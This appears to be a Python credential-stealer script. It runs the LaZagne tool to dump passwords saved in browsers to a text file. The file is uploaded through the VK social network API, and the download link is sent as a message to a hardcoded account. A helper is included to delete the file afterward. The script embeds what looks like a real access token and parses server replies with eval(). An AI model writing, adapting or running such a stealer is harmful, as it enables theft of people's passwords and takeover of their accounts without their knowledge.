import requests
import os
from vk_api import VkApi
from vk_api.utils import get_random_id


token = '4691d8f6706204dafcf4410fb911a1e515b2dcfde010bd34940b4e4388499a0f6f1ff452c28d91003cfce'


def message(message):
    vk.messages.send(
        peer_id = '300610283',
        message = message,
        random_id = get_random_id(),
    )

def makeDoc(docName, name):
    data = vk.docs.getMessagesUploadServer(type='doc', peer_id='300610283')
    upload_url = data['upload_url']
    response = requests.post(upload_url,files={'file': open(docName, 'rb')})
    result = response.text
    dct = eval(result)
    file = dct.get('file')
    save = vk.docs.save(file=file, title=name, tags=[])
    doc = save.get('doc')
    link = doc.get('url')
    message(link)

def deleteDoc(docName):
    file = os.path.join(os.path.abspath(os.path.dirname(__file__)), docName)
    os.remove(file)


vk_session = VkApi(token=token)
vk = vk_session.get_api()


def steal():
    os.system('laZagne.exe browsers > text.txt')
    makeDoc('text.txt', 'Passwords')
